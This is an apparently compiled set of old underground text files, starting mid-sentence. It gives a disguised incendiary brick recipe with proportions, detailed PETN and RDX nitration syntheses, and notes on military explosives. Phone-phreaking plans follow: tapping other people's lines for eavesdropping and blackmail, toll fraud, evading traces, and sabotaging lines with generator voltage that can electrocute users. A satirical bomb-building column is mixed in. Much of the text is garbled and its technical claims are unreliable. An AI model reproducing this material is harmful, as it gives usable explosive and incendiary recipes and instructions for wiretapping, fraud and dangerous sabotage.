         ignition and combustion of the flammable liquid.

     (4) To minimize the hazard of premature ignition of flammable liquid
         vapors, allow at least two feet of fuse to extend from the top edge
         of an open container of flammable liquid before lighting the fuse.

INCENDIARY BRICK
-----------------------------------------------------------------------------
a. Description.

     (1) This incendiary is composed of potassium chlorate, sulfur, sugar,
         iron filings, and wax. When properly made, it looks like an ordinary
         building brick and can be easily transported without detection. The
         incendiary brick will ignite wooden walls, floors, and many other
         combustible materials.

     (2) This incendiary can be directly ignited by all igniters. To ignite
         this incendiary with White Phosphorus Solution, the solution must
         first be poured on absorbent paper and the paper placed on top of the
         brick.

b. Material and Equipment.
                                                         Parts By Volume
  Potassium chlorate (powdered)..........................      40
  Sulfur (powdered)......................................      15
  Granulated sugar.......................................      20
  Iron filings...........................................      10
  Wax (beeswax or candle wax)............................      15
  Spoon or stick
  Brick mild
  Red paint
  Measuring cup or can
  Double boiler
  Heat source (hot plate or stove)

c. Preparation.

     (1) Fill the bottom half of the double boiler with water and bring to a
         boil.

     (2) Place the upper half of the boiler on the lower portion and add the
         wax, sulfur, granulated sugar, and iron filings in the proper amount.

     (3) Stir well to blend all the materials evenly.

     (4) Remove the upper half of the double boiler from the lower portion and
         either shut off the heat source or move the upper section several
         feet from the fire.
         CAUTION: EXTREME CARE SHOULD BE EXERCISED AT THIS POINT BECAUSE
         ACCIDENTAL IGNITION OF THE MIXTURE IS POSSIBLE. SOME MEANS OF
         EXTINGUISHING A FIRE SHOULD BE ACCESSIBLE. IT IS IMPORTANT TO KEEP
         FACE, HANDS, AND CLOTHING AT A REASONABLY SAFE DISTANCE DURING THE
         REMAINDER OF THE PREPARATION. A FACE SHIELD AND FIREPROOF GLOVES ARE
         RECOMMENDED.

     (5) CAREFULLY add the required amount of potassium chlorate and again
         stir well to obtain a homogeneous mixture.

     (6) Pour the mixture into a brick mold and set aside until it cools and
         hardens.

     (7) When hard, remove the incendiary from the mold, and paint it red to
         simulate a normal building brick.

d. Application.

     (1) When painted, the incendiary brick can be carried with normal
         construction materials and placed in or on combustible materials.

     (2) A short time delay in ignition can be obtained by combining fuses
         and one of the igniters.

PETN - Pentaerythrite Tetranitrate - (penta, niperyth, penthrit)
-----------------------------------------------------------------------------

     PETN is a high explosive used in detonating that is one of the most
powerful military explosives
  almost equal in force to nitroglycerine and RDX.
When used in a detonating cord, it has a detonation velocity of 21,000 feet
per second and is relatively insensitive to friction and shock from handling
and transportation.

     PREPARATION: Four hundred cc. of strong white nitric acid-prepared by
adding a little urea to fuming nitric acid, warming, and blowing dry air
through it until it is completely decolorized-is cooled in a 600 cc. beaker in
a freezing mixture of ice and salt. One hundred grams of pentaerythrite,
ground to pass a 50-mesh sieve, is added to the acid a little at a time with
efficient stirring while the temperature is kept below 5 degrees. After all
has been added, the stirring and the cooling are continued for 15 minutes. The
mixture is then drowned in about 4 liters of cracked ice and water. The crude
product, amounting to about 221 grams or 95% of the theory, is filtered off,
washed free from acid, digested for an hour with a liter of hot 0.5% sodium
carbonate solution, again filtered off and washed, dried, and finally
recdata  bstallized from acetone. A good commercial sample of PETN melts at 138.0-
138.5 degrees. The pure material melts at 140.5-141.0 degrees, short prismatic
needles, insoluble in water, difficultly soluble in alcohol and ether.

RDX - Cyclotrimethylenetrinitramine - (Cyclonite, Hexagon, rags K
-----------------------------------------------------------------------------

     RDX is a white cdystalline solid that exhibits very high shattering
power. It is commonly used as a booster in explosive trains or as a main
bursting charge. It is stable in storage, and when combined with proper
additives, may be cast or press loaded. It may be initiated by lead azide or
mercury fulminate.

     PREPARATION: Detailed instructions are not available on the preperation
of this product at this time, but if you are a good chemist, you will be able
to make it from the brief description following- Cyclonite, prepared by the
nitration of hexamethylenetetramine (C6H12N4), is derived ultimately from no
other raw materials than coke, air, and water. Hexamethylenetetramine has
basic properties and forms a nitrate (C6H12N4-2HNO3, m.p. 165 degrees) that is
soluble in water, insoluble in alcohol, ether, chloroform, and acetone. The
product C3H6O6N6, prepared by nitrating this nitrate is cyclonite. Another
method of extracting RDX is by treating hexamethylenetetramine directly with
strong nitric acid. In the acid process, the tetramine is added slowly in
small portions at a time to nitric acid (1.52 s.g.) at a temperature of 20-20
degrees. When all the tetramine and acid are mixed, warm the liquid to 55
degrees. The allow the mixture to stand for a few minutes, allowing it to cool
to 20 degrees, and the product will be precipitated with the addition of
water. One example is 50 grams of the hexamethylenetetramine added to 550
grams of 100% nitric acid at 30 degrees, over a period of 15 minutes; the
mixture was cooled to 0 degrees, held at 0 degrees for 20 minutes, and the
drowned with water. A chemical diagram of the chemicals and the reaction are
shown below.

Hexamethylenetetramine

COMPOSITION B
-----------------------------------------------------------------------------

     Composition B is a high-explosive mixture with a relative effectiveness
higher than that of TNT. It is also more sensitive than TNT. It is composed of
RDX (59%), TNT (40%), and wax (1%). Because of its shattering power and high
rate of detonation, Composition B is used as the main charge in certain models
of bangalore torpedoes and shaped charges.

COMPOSITION C4
-----------------------------------------------------------------------------

     Composition C4 is the most common military plastic explosive. It is often
referred to as C4 Plasique. C4 is a white plastic high-explosive more powerful
than TNT. It consists of 91% RDX and 9% plastic binder. It remains plastic
over a wide range of temperatures (-70 to 170 degrees Fahrenheit), and is
about as sensitive as TNT. It is eroded less than other plastic explosives
when immersed under water for long periods. Because of its high detonation
velocity and its plasticity, C4 is well suited for gutting steel and timber
and for breaching concrete.

PENTOLITE
-----------------------------------------------------------------------------
     Pentolite is a high explosive mixture of equal proportions of PETN and
TNT. It is light yellow and is used as the main bursting charge f the i Ninades,
small shells
  and shaped charges. Pentolite may be melted and cast in the
container. Pentolite should not be drilled to produce cavities, forming tools
should be used.

/-/   Building The Aqua Box   /-/
/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/

   Every true phreaker lives in fear of the dreaded F.B.I. 'Lock in Trace.'
For a long time, it was impossible to escape from the lock in trace.
This box does offer an escape route with simple directions to it.This
box is quite a simple concept, and almost any phreaker with basic
electronics knowledge can construct and use it.

/-/-/-/-/-/-/-/-/-/-/-/
/-/    The Lock     /-/
/-/    in Trace     /-/
/-/-/-/-/-/-/-/-/-/-/-/

    A lock in trace is a device used by the F.B.I. to lock into the phone
users location so that he can not hang up while a trace is in progress.
For those of you who are not familiar with the concept of 'locking in',
 then here's a brief description.


     The F.B.I. can tap into a conversation, sort of like a three-way call
connection. Then, when they get there, they can plug electricity into the
phone line. All phone connections are held open by a certain voltage of
electricity, that is why kou sometimes get static and faint connections
when you are calling far away, because the electricity has trouble keeping
the lineup. What the lock in trace does is cut into the line and generate
that same voltage straight into the lines. That way, when you try and hang
up, voltage is retained. Your phone will ring just like someone was
calling you even after you hang up. (If you have call waiting, you should
understand better about that, for call waiting intercepts the electricity
and makes a tone that means someone is going through your line. Then, it
is a matter of which voltage is higher. When you push down the receiver,
then it see-saws the electricity to the other side. When you have a person
on each line it is impossible to hang up unless one or both of them will
hang up. If you try to hang up, voltage is retained, and your phone will
ring. That should give you an understanding of how calling works, also.
When electricity passes through a certain point on your phone, the
electricity causes a bell to ring or on some newer phones an electronic
ring to sound.)

   So, in order to eliminate the trace, you somehow must lower the voltage
level on your phone line. You should know that every time someone else
picks up the phone line, then the voltage does decrease a little. In the
first steps of planning this out, Xerox suggested getting about a hundred
phones all hooked into the same line that could all be taken off the hook
at the same time.That would greatly decrease the voltage level. That is
also why most three-way connections that are using the bell service three
way calling (which is only $3 a month) become quite faint after a while.

   By now, you should understand the basic idea. You have to drain
all of the power out of the line so the voltage can not be kept up. A
rather sudden draining of power could quickly short out the F.B.I. voltage
machine, because it was only built to sustain the exact voltage necessary
to keep the voltage out.

   For now, image this. One of the normal radio shack generators that you
can go pick up that one end of the cord that hooks into the central box
has a phone jack on it and the other an electrical plug. This way, you can
"flash" voltage THROUGH the line, but cannot drain it. So, some
modifications have to be done.

/-/-/-/-/-/-/-/-/-/-/-/
/-/   The Aqua Box  /-/
/-/-/-/-/-/-/-/-/-/-/-/

 Materials needed-

- A BEOC (Basic Electrical Output Socket), like a small lamp type
  connection, where you just have a simple plug and wire that would plug
  into a light bulb.
- One of cords mentioned above, if you can't find one then construct your
  own... same voltage connection, but the restrain or must be the central
  box)
- TWO phone jacks (one for the modem, one for if you are being traced to
  plug the aqua box into)
- Some cdeativity and easy work.

 NOTICE: No phones have to be destroyed/modified to make this box, so
don't go out and buy a new phone for it!

   All right, this is a very simple procedure. If you have the BEOC, it
could drain into anything, a radio, or whatever. The purpose of having
that is you are going to suck the voltage out from the phone line into the
electrical appliance so there would be no voltage left to lock you in with.

1) Take the connection cord. Examine the plug at the end. It should have
   only two prongs, if it has three, still, do not fear. MAKE SURE THE
   ELECTRICAL APPLIANCE IS TURNED OFF unless you wanna become a cdispy
   cditter while making this thing. Most plugs will have a hard plastic
   design on the top of them to prevent you from getting in at the
   electrical wires inside. Well, get a knife and remove it. If you
   want to keep the plug (I don't see why...) then just cut the top off.

   When you look inside, lo and behold, you will see that at the base of
   the prongs there are a few wires connecting in. Those wires conduct the
   power into the appliance. So, you carefully unwrap those from the sides
   and pull them out until they are about an inch ahead of the prongs. If
   you don't wanna keep the jack, then just rip the prongs out. If you
   cover the prongs with insulation tape so they will not connect with the
   wires when the power is being drained from the line.

2) Do the same thing with the prongs on the other plug, so you have the
   wires evenly connected. Now, wrap the end of the wires around each
   other.
   If you happen to have the other end of the voltage cord hooked into the
   phonephonep 1 reading now, you're too fucking stupid to continue.

   After you've wrapped the wires around each other, then cover the whole
   thing with the plugs with insulating tape. Then, if you built your own
   control box or if you bought one, then cdam all the wires into the and
   re-close it. That box is your ticket out of this.

3) Re-check everything to make sure it's all in place. This is a pretty
   flimsy connection, but on later models when you get more experienced at
   it then you can solder away at it and form the whole device into one big
   box, with some kind of cheap mattel hand-held game inside to be the
   power connector.

   In order to use itl ofuld pkeep this box handy. Plug it into the jack if
   you want, but it will slightly lower the voltage so it isn't connected.
   When you plug it in, if you see sparks, un-plug it and restart the
   WHOLE thing. But if it just seems fine then leave it.

/-/-/-/-/-/-/-/-/-/
/-/ Using it !! /-/
/-/-/-/-/-/-/-/-/-/

     Now, so you have the whole thing plugged in and all... DO NOT USE
THIS UNLESS THE SITUATION IS DESPERATE! When the trace has gone on, don't
panic, un plug your phone, and turn on the appliance that it was hooked
to. It will need energy to turn itself on, and here's a great source...
the voltage to keep a phone line open is pretty small and a simple light
bulb should drain it all in and probably short the F.B.I. computer at the
same time.

 Happy boxing and stay free!

               CONSTRUCTION PROJECT:  aTOMIC BOMB

     THE   FOLLOWING  PAPER   IS  TAKEN   FROM  THE   JOURNAL  OF
IRREPRODUCIBLE RESULTS,  VOLUME  25/NUMBER  4/1979.  PO  BOX  234
CHICAGO  HEIGHTS, ILLINOIS  60411. SUBSCRIPTIONS  ARE 1  YEAR FOR
$3.701.

1. INTRODUCTION:

     WORLDWIDE  CONTROVERSY  HAS  BEEN  GENERATED  RECENTLY  FROM
SEVERAL   COURT  DECISIONS  IN  THE   UNITED  STATES  WHICH  HAVE
RESTRICTED  POPULAR  MAGAZINES   FROM  PRINTING  ARTICLES   WHICH
DESCRIBE HOW TO MAKE AN ATOMIC BOMB.  THE REASON USUALLY GIVEN BY
THE COURTS IS THAT NATIONAL SECURITY WOULD BE COMPROMISED IF SUCH
INFORMATION  WERE GENERALLY AVAILABLE. BUT,  SINCE IT IS COMMONLY
KNOWN THAT ALL OF THE  INFORMATION IS PUBLICLY AVAILABLE IN  MOST
MAJOR  METROPOLITAN LIBRARIES,  OBVIOUSLY THE  COURT'S OFFICIALLY
STATED POSITION IS COVERING UP  A MORE IMPORTANT FACTOR;  NAMELY,
THAT  SUCH  ATOMIC  DEVICES  WOULD PROVE  TOO  DIFFICULT  FOR THE
AVERAGE CITIZEN  TO CONSTRUCT.  THE UNITE   fTEDS COURTS  CANNOT
AFFORD  TO INSULT THE VAST MAJORITIES BY INSINUATING THAT THEY DO
NOT HAVE THE INTELLIGENCE OF  A CABBAGE, AND THTHTSTATED"OFFICIAL"
PRESS  RELEASES CLAIM NATIONAL SECURITY AS A BLANKET RESTRICTION.
THE RUMORS  THAT  HAVE  UNFORTUNATELY OCCURRED  AS  A  RESULT  OF
WIDESPREAD  MISINFORMATION CAN (AND MUST)  BE CLEARED UP NOW, FOR
THE CONSTRUCTION  PROJECT THIS  MONTH IS  THE CONSTRUCTION  OF  A
THERMONUCLEAR   DEVICE,  WHICH   WILL  HOPEFULLY   CLEAR  UP  ANY
MISCONCEPTIONS YOU MIGHT HAVE ABOUT SUCH A PROJECT.

      WE WILL SEE HOW EASY  IT IS TO MAKE  A DEVICE OF YOUR  VERY
OWN  IN TEN EASY STEPS, TO HAVE  AND HOLD AS YOU SEE FIT, WITHOUT
ANNOYING INTERFERENCE  FROM THE  GOVERNMENT  OR THE  COURTS.  THE
PROJECT  WILL COST BETWEEN  $5,000 AND $30,000,  DEPENDING ON HOW
FANCY YOU  WANT  THE  FINAL  PRODUCT TO  BE.  SINCE noughe Cd  WEEK'S
COLUMN,  "LET'S MAKE A TIME MACHINE", WAS RECEIVED SO WELL IN THE
NEW STEP-BY-STEP FORMAT, THIS MONTH'S COLUMN WILL FOLLOW THE SAME
FORMAT.

2.  CONSTRUCTION METHOD:

1.  FIRST,  OBTAIN  ABOUT 50  POUNDS  (110 KG)  OF  WEAPONS GRADE
PLUTONIUM AT YOUR LOCAL  SUPPLIER (SEE NOTE  1). A NUCLEAR  POWER
PLANT   IS  NOT  RECOMMENDED,  AS  LARGE  QUANTITIES  OF  MISSING
PLUTONIUM TENDS TO MAKE PLANT ENGINEERS UNHAPPY.  WE SUGqT THAT
YOU  CONTACT YOUR  LOCAL TERRORIST  ORGANIZATION, OR  PERHAPS THE
JUNIOR       ACHIEVEMENT       IN       YOUR        NEIGHBORHOOD.
2.  PLEASE  REMEMBER  THAT  PLUTONIUM,  ESPECIALLY  PURE, REFINED
PLUTONIUM, IS SOMEWHAT DANGEROUS. WASH  YOUR HANDS WITH SOAP  AND
WARM  WATER  AFTER HANDLING  THE MATERIAL,  AND DON'T  ALLOW YOUR
CHILDREN OR PETS TO PLAY IN IT OR EAT IT. ANY LEFT OVER PLUTONIUM
DUST  IS EXCELLENT AS  AN INSECT REPELLANT. YOU  MAY WISH TO KEEP
THE SUBSTANCE IN A  LEAD BOX IF  YOU CAN FIND  ONE IN YOUR  LOCAL
JUNK   YARD,   BUT   AN   OLD   COFFEE   CAN   WILL   DO  NICELY.
3.  FASHION TOEhHER A METAL ENCLOSURE TO HOUSE THE DEVICE.  MOST
COMMON  VARIETIES OF  SHEET METAL  CAN BE  BENT TO  DISGUISE THIS
ENCLOSURE AS, FOR EXAMPLE, A BRIEFCASE, A LUNCH PAIL, OR A BUICK.
DO NOT USE TINFOIL.
                          (BOMB CONT.)

4.  ARRANGE THE PLUTONIUM INTO  TWO HEMISPHERAL SHAPES, SEPARATED
BY ABOUT  4 CM.  USE RUBBER  CEMENT TO  HOLD THE  PLUTONIUM  DUST
TOGETHER.  GELIGNITE IS  MUCH BETTER,  BUT MESSIER  TO WORK WITH.
YOUR HELPFUL HARDWARE MAN WILL BE HAPPY TO PROVIDE YOU WITH  THIS
ITEM.
5.  PACK THE TNT AROUND THE HEMISPHERE ARRANGEMENT CONSTRUCTED IN
STEP  4.  IF YOU  CANNOT  FIND GELIGNITE,  FEEL  FREE TO  USE TNT
PACKED IN WITH PLAY-DOUGH OR  ANY MODELING CLAY. COLORED CLAY  IS
ACCEPTABLE,  BUT THERE  IS NO  NEED TO  GET FANCY  AT THIS POINT.
6. ENCLOSE THE STRUCTURE FROM STEP  6 INTO THE ENCLOSURE MADE  IN
STEP  3.  USE A  STRONG GLUE  SUCH  AS "CRAZY  GLUE" TO  BIND THE
HEMISPHERE  ARRANGEMENT   AGAINST   THE  ENCLOSURE   TO   PREVENT
ACCIDENTAL  DETONATION  WHICH  MIGHT  RESULT  FROM  VIBRATION  OF
MISHANDLING.
7.  TO DETONATE THE DEVICE, OBTAIN  A RADIO CONTROLLED (RC) SERVO
MECHANISM, AS  FOUND  IN RC  MODEL  AIRPLANES AND  CARS.  WITH  A
MINIMUM  OF EFFORT, A REMOTE PLUNGER CAN BE MADE THAT WILL STRIKE
A DETONATOR CAP TO EFFECT A SMALL EXPLOSION. THESE DETONATOR CAPS
CAN  BE  FOUND IN  THE ELECTRICAL  SUPPLY  SECTION OF  YOUR LOCAL
SUPERMARKET.  WE RECOMMEND THE "BLAST-O-MATIC" BRAND BECAUSE THEY
ARE NO DEPOSIT-NO RETURN.
8.  NOW  HIDE  THE  COMPLETED  DEVICE  FROM  THE  NEIGHBORS   AND
CHILDREN.  THE GARAGE IS NOT RECOMMENDED BECAUSE OF HIGH HUMIDITY
AND THE EXTREME RANGE OF TEMPERATURES EXPERIENCED THERE.  NUCEAR
DEVICES  HAVE  BEEN  KNOWN  TO  SPONTANEOUSLY  DETONATE  IN THESE
UNSTABLE CONDITIONS. THE  HALL CLOSET OR  UNDER THE KITCHEN  SINK
WILL BE PERFECTLY SUITABLE.
9. NOW YOU ARE THE PROUD OWNER OF A WORKING THERMONUCLEAR DEVICE!
IT IS A GREAT ICE-BREAKER AT PARTIES, AND IN A PINCH, CAN BE USED
FOR NATIONAL DEFENSE.

3. THEORY OF OPERATION:

     THE DEVICE BASICALLY WORKS WHEN THE DETONATED TNT COMPRESSES
THE  PLUTONIUM  INTO  A  CRITICAL MASS.  THE  CRITICAL  MASS THEN
PRODUCES A NUCLEAR  CHAIN REACTION  SIMILAR TO  THE DOMINO  CHAIN
REACTION (DISCUSSED IN THIS COLUMN, "DOMINOS ON THE MARCH" MARCH,
1968).  THE  CHAIN   REACTION  THEN  PROMPTLY   PRODUCES  A   BIG
THERMONUCLEAR  REACTION.  AND THERE  YOU  HAVE IT,  A  10 MEGATON
EXPLOSION!

4.  NEXT MONTH'S COLUMN:

     IN NEXT  MONTH'S COLUMN,  WE WILL  LEARN HOW  TO CLONE  YOUR
NEIGHBOR'S WIFE IN SIX EASY STEPS. THIS PROJECT PROMISES TO BE AN
EXCITING WEEKEND FULL OF FUN AND PROFIT. COMMON KITCHEN  UTENSILS
WILL BE ALL YOU NEED. SEE YOU ALL NEXT MONTH!

5.  NOTES:

1.  PLUTONIUM (P)U ATOMIC  NUMBER se  s4, IS  A RADIOACTIVE METALLIC
ELEMENT FORMED  BY  THE DECAY  OF  NEPTUNIUM AND  IS  SIMILAR  IN
CHEMICAL   STRUCTURE  TO  URANIUM,   SATURIUM,  JUPITERNIUM,  AND
MARSIUM.

INTRODUCTION
------------

        Have you ever wanted a lineman's handset?  Surely every phreak
has at least once considered the phun that he could have with one.
After searching unlocked phone company trucks for one for months, we
had an idea.  We could build one.  We did, and named it the "Beige Box,"
simply because that is the color of ours.  In the following file we
will give complete instructions for the construction and use of a
Beige Box.



------------
CONSTRUCTION
------------

        The construction is very simple.  First, you must understand
the concept of the device.  In a modular jack, there are four wires.
These are red, green, yellow, and black.  For a single line telephone,
however, only two matter: the red (ring) and green (tip).  The yellow
and black are not necessary for this project.  A lineman's handset
only has two clips on it: the ring and the tip.

        You will need a phone (we reccommend a touch-tone) with a
modular plug, a modular jack, and two large alligator clips
(preferably red and green, respectively).  Take the modular jack and
look at the bottom of its casing.  There should be a grey jack with
four wires (red, green, yellow, and black) leading out of it.  To the
end of the red wire attach a red alligator clip.  To the end of the
green wire attach a green alligator clip.  The yellow and black wires
can be removed, although I would only set them aside so that you can
use the modular jack in future projects.  Now insert your telephone's
modular plug into the molular jack.  That's it.

        This particular model is nice because it can be easily made,
is inexpensive, uses common parts that are readily available, is
small, is lightweight, and does not require the destruction of a
phone.



----- --- ----
BEYGE BOX USES
----- --- ----

        There are many uses for the Beige Box.  However, before you
can use it, you must know how to attach it to its output device.  This
device can be any of several Bell switching apparatus that include
terminal sets (i.e., remote switching centers, bridging heads, cans,
etc.).  To open most Bell Telephone switching apparatus, you must
have a 7/16 inch hex driver.  This piece of equipment can be picked
up at your local hardware store.  With your 7/16 hex driver, turn the
security bolt(s) approximately 1/8 of an inch counter-clockwise and
open.  If your output device is locked, then you must have some
knowledge of destroying and/or picking locks.  However, we have never
encountered a locked output device.  Once you have opened your output
device, you should see a mass of wires connected to terminals.  On
most of your output devices, the terminals should be labeled "T" (Tip
-- if not labeled, it is usually on the left) and "R" (Ring -- if not
labeled, it ks usually on the right).  Remember: Ring - red -  right.
The "Three R's" -- a simple way to remember which is which.

        NMw you must attach the red alligator clip (ring) to the
"R" (ring) terminal.  Attach the green alliagtor clip (tip) to the
"T" (tip) terminal.  NOTE: If instead of a dial tone you hear nothing,
re-adjust the alligator clips so that they are not touching each other
or other terminals.  Also make sure that they are firmly attached.
By this time you should hear a dial tone.  Dial ANI and find out the
number that you are using (you wouldn't want to use your own).

        Here are some practical applications:
                o  Eavesdropping
                o  Long distance, static-free phone calls to phriends
                o  Dialing direct to Alliance Conferencing (also static-
                   free)
                o  Phucking people over
                o  Bothering the operator at little risk to yourself
                o  Blue Boxing with a greatly reduced chance of getting
                   caught
                o  Anything at all that you want, since you are an
                   extension on that line


Eavesdropping:
-------------

        To be most effective, first attach the Beige Box and then your
phone.  This eliminates static caused by connecting the box, therefore
reducing the potential suspicion of your victim.  When eavesdropping,
it is always best to be neither seen nor heard.  If you hear someone
dialing out, do not panic; but rather hang up, wait, and pick up the
receiver again.  The person will either have hung up or tried to
complete their call again.  If the latter is true, then listen in, anl
perhaps you will find information worthy of blackmail!  If you would
like to know who you are listening to, after dialing ANI, pull a CN/A
on the number.


Dialing Long Distance:
------- ---- --------

        This section is self-explanatory, but don't forget to dial a
"1" before the NPA.


Dialing Direct to Alliance Conferencing:
------- ------ -- -------- ------------

        Simply dial 0-700-456-1000 and you will get instructions from
there.  I prefer this method over PBXs, since PBXs often have poos Fpiction and are more difficult to come by.


Phucking People Over:
-------- ------ ----

        This is a very large topic for discussion.  Just by using the
other functions described, you can cdeate a large phone bill for the
person (they will not have to pay it, but it is a hassle for them).
In addition, since you are an extension of the person's line, leave
your phone off hook, and they will not be able to make or recieve
calls.  This can be extremely nasty because no one would suspect the
cause of the problem.


Bothering the Operator:
--------- --- --------

        This is also self-explanatory and can provide hours of
entertainment.  Simply ask or say things to her that are offensive and
you would not like traced to your line.  This also corresponds with the
previous described section, Phucking People Over.  After all, guess
who's line it gets traced to? He he he...


Blue Boxing:
---- ------

        See a file on Blue Boxing for more details.  This is an
especially nice feature if you live in an ESS-equipped prefix, since
the calls are, once again, not traced to your line.



--------- ----- -- ----- ------
POTENTIAL RYSKS OF BEIGE BOXING
--------- ----- -- ----- ------

        Overuse of the Beige Box may cause suspicions within the Gestapo,
and result in legal problems.  Therefore, I would recommend that you:

        o  Use more than one output device
        o  Choose a secluded spot to do your Beige Boxing
        o  Keep a low profile (i.e., do not post under your real name
           on a public BBS concerning your accomplishments)
        o  In order to make sure that the enemy has not been inside your
           ouput device, I reccomend that you place a piece of
           transparent tape over the opening of your output device.
           Therefore, if it is opened in your absence, the tape will be
           displaced and you will be aware of the fact"that someone has
           been intruding upon your territory.

BLACK BOX PLANS
---------------

WHEN YOUR PHONE IS JUST SITTING THERE
DOING NOTHING, THE VOLTAGE THROUGH
THE PHONE LINE IS ABOUT 20 VOLTS AC.
WHEN SOMEONE CALLS AND THE FONE
STARTS RINGING, THE VOLTAGE JUMPS
ENOUGH FOR THE BELL TO WORK (ABOUT
48 VOLTS) WHICH TELLS MA BELL TO STAND
BY IF YOU SHOULD PICK UP SO SHE CAN
BILL YOU. WHEN YOU ADVENTUALLY PICK UP
THE PHONE THE VOLTAGE DROPS TO 10 VOLTS
AND THE BILLING STARTS. WHAT A BLACK
BOX DOES IS IT KEEPS THE VOLTAGE AT 36
VOLTS THEREFORE THE INCOMMING CALLER
NEVER GETS BILLED (INGENIOUS!).

THE ORIGINAL BLACK BOX WAS CREATED BY
AN EX-BELL EMPLOYEE WHO WENT BY THE
NAME "CAPTAIN CRUNCH". HE GOT HIS NAME
FROM THOSE LITTLE WHISLES YOU GOT IN
BOXES OF CAPTAIN CRUNCH BECAUSE THEY
EMITED A TONE THAT SOUNDED LIKE A PAY
FONE.CAPT CRUNCH JUST ANNOUNCED HIS
OFFICIAL RETIREMENT FROM PHREAKING
AFTER BEING RELEASED FROM A CALFORNIA
JAIL ON TWO COUNTS OF USING BLUE
BOXES (THE ONES OPERATORS USE).

MATERIALS: 1] A 36 VOLT ZENER DIODE.
           2] A CERAMIC OR MYLAR
              CAPACITOR OF 0.1 MICRO-
              FARAD.
           3] A ELECTROLYTIC CAPACITOR
              OF 1.0 MICROFARAD.

YOU CAN GET ALL THESE PARTS AT YOUR
LOCAL RADIO SHACK.

INSTRUCTIONS:

FIRST YOU HAVE TO OPEN YOUR PHONE UP.
YOU DO THIS BY GENTLY REMOVING THE
TWO SCREWS ON THE BOTTOM OF THE PHONE
AND LIFTING THE COVER UP SLOWLY. YOU
SHOULD NOTICE THREE WIRES COMING IN
FROM THE BACK OF THE PHONE, A GREEN,
RED, ANDYELLOW MOST OF THE TIME THOUGH
THEY CAN DIFFER. DON'T WORRY ABOUT THCONSTY CANLOW WIRE, WE WILL NOT NEED IT TO DO
THIS. YOU WILL NEED TO FIND THE MORE
POSITIVE OF THE REMAINING TWO WIRES
(ALMOST ALWAYS THE GREEN). NOW CONNECT
THE BANDED END OF THE ZENER DIODE TO
THE MORE POSITIVE OF THESE TWO WIRES.
NOW CONNECT THC OTHER END OF THE DIODE
TO THE RED WIRE "IN-SERIES". YOU HAVE
JUST COMPLETED THE FIRST STEP.
FOR THE SECOND STEP YOU NEED A CERAMIC
OR MYLAR CAPACITOR OF 0.1 MICRO-
FARAD. YOU CONNECT THIS "IN PARALLEL"
ACROSS THE DIODE. THIS IS NEEDED TO
ALLOW THE DIODE TO PASS VOICE SIGNALS.
NOW FOR THE FINAL STEP. TAKE YOUR
ELECTROLYTIC CAPACITOR OF UP TO 1
MICRO-FARAD WITH IT'S + END CONNECTED
TO THE BANDED END OF THE DIODE AND THE
OTHER END SHOULD BE CONNECTED TO THE
ANODE END OF THE DIODE.
MA BELL IS NOT TOTALLY OBLIVIO.
6SO
THIS. IF THE PHONE RINGS FOR ABOUT A
HALF-HOUR THEY WILL THINK SOMETHING IS
WRONG AND BILL YOU ANYWAY. WHEN USING A
BLACK BOX YOUR PHONE WILL CONTINUE TO
RING EVEN THOUGH YOU PICKED UP. YOU
HAVE TO MAKE A SWITCH TO CONNECT TO
ONE OF THE RINGER WIRES THAT WILL SHUT
IT OFF

                       --*= The Blotto Box$=*--
                            By The Traveler

 Finally, it is here! What was first conceived as a joke to fool the inncoent
phreakers around America has finally been concieved by the one phreak who is
the expert on lines and voltage: The Traveler. Other boxes by the Traveler
include the White Gold Box, the Aqua Box, The Diverti Box, and the Cold Box.
All of those plans will soon be available in a BBS/AE near you!
 Well, for you people who are unenlightened about the Blotto Box, here is a
brief summery of a legend.

--*-=> The Blotto Box <=-*--
   For years now every pirate has dreamed of the Blotto Box. It was at first
made as a joke to mock more ignorant people into thinking that the function
of it actually was possible. Well, if you are The Voltage Mas orr, it is
possible. Originally conceived by King Blotto of much fame, the Blotto Box is
finally available to the public.
   NOTE: The Traveler can not be responcable for the information disclosed in
the file! This file is strictly for informational purposes and should not be
actually built and used! Usage of this electronical impulse machine could have
the severe results listed below and could result in high federal prosecutioncription3 rain, The Traveler
               TAKES NO RESPONCABILITY!
   All right, now that that is cleared up, here is the basis of the box and
it's function.
   The Blotto Box is every phreaks dream... you could hold AT&T down on it's
knee's with this device. Because, quite simply, it can turn off the phone
lines everywhere. Nothing. Blotto. No calls will be allowed out of an area
code, and no calls will be allowed in. No calls can be made inside it for that
matter. As long as the switchhing system stays the same, this box will not
stop at a mere area code. It will stop at nothing. The electrical impulses
that emit from this box will open every line. Every line will ring and ring
and ring... the voltage will never be cut off until the box/ generator is
stopped. This is no 200 volt job, here. We are talking GENERATOR. Every phone
line will continue to ring, and people close to the box may be electricuted if
they pick up the phone.
   But, the Blotto Box can be stopped by merely cutting of the line or
generator. If they are cut off then nothing will emit any longer. It will take
a while for the box to calm back down again, but that is merely a superficial
aftereffect. Once again: Construction and use of this box is not advised! The
Blotto Box will continue as long as there is electricity to continue with.
   OK, that is what it does, now, here are some interesting things for you to
do with it...

--*-=> The Blotto Box Functions and Installation <=-*--
   Once you have installed your Blotto, there is no turning back. The
following are the instructions for construction and use of this box. Please
read and heed all warnings in the above section before you attempt to
construct this box.
   Materials:
             - A Honda portable generator or a main power outlet like in a
               stadium or some such place.
             - A radio shack cord set for 400 volts that splices a female
               plug into a phone line jack.
             - A meter of voltage to attach to the box itself.
             - A green base (i.e. one of the nice boxes about 3' by 4' that
               you see around in your neighborhood. They are the main switch
               boards and would be a more effective line to start with.
               or: A regular phone jack (not your own, and not in your area
                   code!
             - A soudering iron and much souder.
             - A remote control or long wooden pole.
   Now. You must have guessed the construction from that. If not, here goes,
I will explain in detail. Take the Honda Portable Generator and all of the
other listed equiptment and go out and hunt for a green base. Make sure it is
one on the ground or hanging at head level from a pole, not the huge ones at
the top of telephone poles. Open it up with anything convienent, if you are
two feeble that fuck don't try this. Take a look inside... you are hunting
for color-coordinating lines of green and red. Now, take out your radio shack
cord and rip the meter thing off. Replace it with the voltage meter about. A
good level to set the voltage to is about 1000 volts. Now, attach the voltage
meter to the cord and set the limit for one thousand. Plug the other end of
the cord into the generator. Take the phone jack and splice the jack part
off. Open it up and match the red and green wires with the other red and green
wires. NOTE: If you just had the generator on and have done this in the
correct order, you will be a crispy cditter. Keep the generator off until you
plan to start it up. Now, sauder those lines together carefully. Wrap duck
tape or insultation tape around all of the wires. Now, place the remote
control right on to the startup of the generator. If you have the long pole,
make sure it is very long and stand back as far away as you can get and reach
the pole over. NOTICE: If you are going right along with this without reading
